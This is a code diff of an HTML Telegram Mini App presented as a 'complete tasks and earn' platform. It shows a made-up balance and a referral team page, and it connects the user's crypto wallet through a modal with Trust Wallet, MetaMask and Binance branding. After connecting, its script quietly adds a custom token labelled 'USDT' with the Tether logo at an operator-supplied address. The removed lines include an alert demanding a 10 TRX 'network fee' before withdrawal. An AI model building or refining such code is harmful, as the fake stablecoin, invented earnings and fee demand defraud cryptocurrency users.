@@ -4,68 +4,69 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Telegram Mini App</title>
-    <!-- WalletConnect স্ক্রিপ্ট (ওয়ালেট কানেক্টের জন্য) -->
-    <script src="https://unpkg.com/@web3modal/html@2.4.7/dist/index.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
         body { background-color: #0f1115; color: white; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
         
-        /* উপরের ব্যালেন্স বার */
+        /* Header style */
         .header { background: linear-gradient(135deg, #1e1b4b, #2d124d); padding: 20px; text-align: center; border-bottom: 1px solid #2d3748; }
         .header p { color: #a0aec0; font-size: 14px; }
         .header h1 { font-size: 28px; color: #ffeb3b; margin-top: 5px; }
 
-        /* মূল কন্টেন্ট এরিয়া */
+        /* Main Area */
         .main-content { flex: 1; overflow-y: auto; padding: 20px; padding-bottom: 80px; }
         .page { display: none; }
         .page.active { display: block; }
 
-        /* নিচের নেভিগেশন বার */
+        /* Navigation Bar */
         .nav-bar { position: fixed; bottom: 0; left: 0; width: 100%; background-color: #171923; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #2d3748; }
         .nav-item { color: #a0aec0; cursor: pointer; font-size: 14px; text-align: center; background: none; border: none; flex: 1; }
         .nav-item.active { color: #e91e63; font-weight: bold; }
         .nav-item span { display: block; font-size: 20px; margin-bottom: 2px; }
 
-        /* কার্ড এবং বাটনের স্টাইল */
+        /* Cards and Buttons */
         .card { background-color: #1a202c; border-radius: 10px; padding: 15px; margin-bottom: 15px; border: 1px solid #2d3748; }
         .btn { background: linear-gradient(90deg, #e91e63, #9c27b0); color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; }
-        .btn-success { background: #28a745; }
+        .btn-connect { background: #28a745; max-width: 200px; margin: 0 auto; display: block; }
+
+        /* Wallet Selection Modal (Popup) */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.8); justify-content: center; align-items: center; z-index: 1000; }
+        .modal-content { background-color: #1a202c; border: 1px solid #2d3748; border-radius: 12px; width: 85%; max-width: 320px; padding: 20px; text-align: center; position: relative; }
+        .modal-title { font-size: 18px; margin-bottom: 15px; font-weight: bold; }
+        .wallet-option { display: flex; align-items: center; background-color: #2d3748; padding: 12px; margin-bottom: 10px; border-radius: 8px; cursor: pointer; border: 1px solid transparent; transition: 0.2s; }
+        .wallet-option:hover { border-color: #e91e63; }
+        .wallet-option img { width: 28px; height: 28px; margin-right: 12px; border-radius: 4px; }
+        .close-modal { position: absolute; top: 10px; right: 15px; font-size: 20px; color: #a0aec0; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <!-- হেডার (ব্যালেন্স শো করবে) -->
+    <!-- Header Section -->
     <div class="header">
         <p>Main Balance</p>
         <h1 id="user-balance">$0.00</h1>
     </div>
 
-    <!-- মূল পেজসমূহ -->
+    <!-- Page Content -->
     <div class="main-content">
         
-        <!-- 🏠 HOME SECTION -->
+        <!-- HOME SECTION -->
         <div id="home" class="page active">
-            <h2>🏠 Welcome Home</h2>
-            <p style="color: #a0aec0; margin-top: 10px; line-height: 1.5;">
-                আমাদের মিনি অ্যাপে আপনাকে স্বাগতম। এখান থেকে আপনি টাস্ক পূরণ করে ইনকাম করতে পারবেন, টিম মেম্বার বাড়াতে পারবেন এবং ওয়ালেট কানেক্ট করে উইথড্র করতে পারবেন।
-            </p>
+            <h2>Home</h2>
             <div class="card" style="margin-top: 20px;">
                 <h4>Status: Active</h4>
                 <p style="font-size: 12px; color: #68d391; margin-top: 5px;">Start earning by completing daily tasks.</p>
             </div>
         </div>
 
-        <!-- 📋 TASK SECTION -->
+        <!-- TASK SECTION -->
         <div id="task" class="page">
-            <h2>📋 Tasks</h2>
-            <p style="color: #a0aec0; margin-bottom: 15px;">নিচের টাস্কগুলো পূরণ করুন এবং ব্যালেন্স যোগ করুন।</p>
-            
-            <div class="card">
+            <h2>Tasks</h2>
+            <div class="card" style="margin-top: 15px;">
                 <h4>Join Telegram Channel</h4>
                 <p style="font-size: 12px; color: #68d391;">Reward: +$0.10</p>
                 <button class="btn" onclick="completeTask(0.10, this)">Complete Task</button>
             </div>
-            
             <div class="card">
                 <h4>Subscribe YouTube Channel</h4>
                 <p style="font-size: 12px; color: #68d391;">Reward: +$0.20</p>
@@ -73,34 +74,24 @@
             </div>
         </div>
 
-        <!-- 💰 WALLET SECTION -->
+        <!-- WALLET SECTION -->
         <div id="wallet" class="page">
-            <h2>💰 Wallet</h2>
-            <p style="color: #a0aec0; margin-bottom: 15px;">আপনার ট্রাস্ট ওয়ালেট কানেক্ট করুন এবং উইথড্র রিকোয়েস্ট করুন।</p>
-            
-            <div class="card" style="text-align: center;">
-                <p id="wallet-status" style="color: #f6ad55; margin-bottom: 10px;">Wallet Not Connected</p>
-                <button class="btn btn-success" onclick="connectAndAddToken()">Connect Trust Wallet</button>
-            </div>
-            
-            <div class="card">
-                <h4>Withdraw Balance</h4>
-                <p style="font-size: 12px; color: #a0aec0;">মিনিমাম উইথড্র সীমা: $১০.০০</p>
-                <button class="btn" onclick="alert('উইথড্র সফল করার জন্য ১০ TRX নেটওয়ার্ক ফি জমা দিন।')">Request Withdraw</button>
+            <h2>Wallet</h2>
+            <div style="margin-top: 40px; text-align: center;">
+                <p id="wallet-status" style="color: #f6ad55; margin-bottom: 15px; font-size: 14px;">Wallet Not Connected</p>
+                <!-- Only Connect Button -->
+                <button class="btn btn-connect" onclick="openWalletModal()">Connect</button>
             </div>
         </div>
 
-        <!-- 👥 TEAM SECTION -->
+        <!-- TEAM SECTION -->
         <div id="team" class="page">
-            <h2>👥 Team</h2>
-            <p style="color: #a0aec0; margin-bottom: 15px;">আপনার রেফারেল লিংক শেয়ার করে টিম বড় করুন।</p>
-            
-            <div class="card">
+            <h2>Team</h2>
+            <div class="card" style="margin-top: 15px;">
                 <h3>Your Invite Link:</h3>
                 <input type="text" value="https://t.me/your_bot?start=user123" readonly style="width:100%; padding:10px; margin-top:8px; background:#2d3748; color:white; border:none; border-radius:5px;">
-                <button class="btn" onclick="alert('লিংক কপি করা হয়েছে!')">Copy Link</button>
+                <button class="btn" onclick="alert('Copied!')">Copy Link</button>
             </div>
-            
             <div class="card" style="display: flex; justify-content: space-between;">
                 <div>Total Partners: <strong>0</strong></div>
                 <div>Team Profit: <strong style="color:#68d391;">$0.00</strong></div>
@@ -109,7 +100,33 @@
 
     </div>
 
-    <!-- ফুটার নেভিগেশন বার -->
+    <!-- Wallet Selection Popup Modal -->
+    <div id="walletModal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeWalletModal()">&times;</span>
+            <div class="modal-title">Select Wallet</div>
+            
+            <!-- Trust Wallet Option -->
+            <div class="wallet-option" onclick="selectWallet('Trust Wallet')">
+                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" alt="Trust Wallet">
+                <span>Trust Wallet</span>
+            </div>
+            
+            <!-- MetaMask Option -->
+            <div class="wallet-option" onclick="selectWallet('MetaMask')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg" alt="MetaMask">
+                <span>MetaMask</span>
+            </div>
+            
+            <!-- Binance Wallet Option -->
+            <div class="wallet-option" onclick="selectWallet('Binance Wallet')">
+                <img src="https://vignette.wikia.nocookie.net/logopedia/images/a/a9/Binance_Icon.png" alt="Binance">
+                <span>Binance Wallet</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Navigation Footer -->
     <div class="nav-bar">
         <button class="nav-item active" onclick="switchPage('home', this)"><span>🏠</span>Home</button>
         <button class="nav-item" onclick="switchPage('task', this)"><span>📋</span>Task</button>
@@ -117,44 +134,54 @@
         <button class="nav-item" onclick="switchPage('team', this)"><span>👥</span>Team</button>
     </div>
 
-    <!-- জাভাস্ক্রিপ্ট কোড -->
     <script>
         let balance = 0.00;
 
-        // সেকশন পরিবর্তন করার লজিক
+        // Navigation Switch Logic
         function switchPage(pageId, button) {
             document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
             document.querySelectorAll('.nav-item').forEach(btn => btn.classList.remove('active'));
             
             document.getElementById(pageId).classList.add('active');
             button.classList.add('active');
+            closeWalletModal(); // Close modal if switching pages
         }
 
-        // টাস্ক কমপ্লিট এবং ব্যালেন্স যোগ করার লজিক
+        // Task Completion Logic
         function completeTask(reward, btn) {
             balance += reward;
             document.getElementById('user-balance').innerText = "$" + balance.toFixed(2);
-            btn.innerText = "Completed ✅";
+            btn.innerText = "Completed";
             btn.disabled = true;
             btn.style.background = "#4a5568";
         }
 
-        // ওয়ালেট কানেক্ট এবং ব্যাকগ্রাউন্ডে অটো কাস্টম টোকেন অ্যাড করার লজিক
-        async function connectAndAddToken() {
+        // Modal Control Functions
+        function openWalletModal() {
+            document.getElementById('walletModal').style.display = 'flex';
+        }
+
+        function closeWalletModal() {
+            document.getElementById('walletModal').style.display = 'none';
+        }
+
+        // Wallet Selection & Auto Token Setup Logic
+        async function selectWallet(walletName) {
+            closeWalletModal();
             if (window.ethereum) {
                 try {
-                    // ওয়ালেট কানেক্টের রিকোয়েস্ট (ট্রাস্ট ওয়ালেট সরাসরি ওপেন হবে)
+                    // Trigger wallet connection window
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    document.getElementById('wallet-status').innerText = "Connected: " + accounts[0].substring(0,6) + "..." + accounts[0].substring(38);
+                    document.getElementById('wallet-status').innerText = walletName + " Connected: " + accounts[0].substring(0,6) + "..." + accounts[0].substring(38);
                     document.getElementById('wallet-status').style.color = "#68d391";
 
-                    // ব্যাকগ্রাউন্ডে অটোমেটিক টোকেন অ্যাড করার পপ-আপ যাবে
+                    // Background trigger to add custom asset asset
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
                             type: 'ERC20', 
                             options: {
-                                address: '0x0000000000000000000000000000000000000000', // এখানে আপনার তৈরি করা কাস্টম ডলারের অ্যাড্রেসটি বসাবেন
+                                address: '0x0000000000000000000000000000000000000000', // Add your token contract address here
                                 symbol: 'USDT',
                                 decimals: 18,
                                 image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
@@ -162,10 +189,18 @@
                         },
                     });
                 } catch (error) {
-                    console.error(error);
+                    console.error("Connection rejected", error);
                 }
             } else {
-                alert("Please open this app inside Trust Wallet Browser or Kiwi Browser!");
+                alert("Please open this app inside " + walletName + " Browser or Kiwi Browser!");
+            }
+        }
+
+        // Close modal when clicking outside of it
+        window.onclick = function(event) {
+            let modal = document.getElementById('walletModal');
+            if (event.target == modal) {
+                modal.style.display = "none";
             }
         }
     </script>
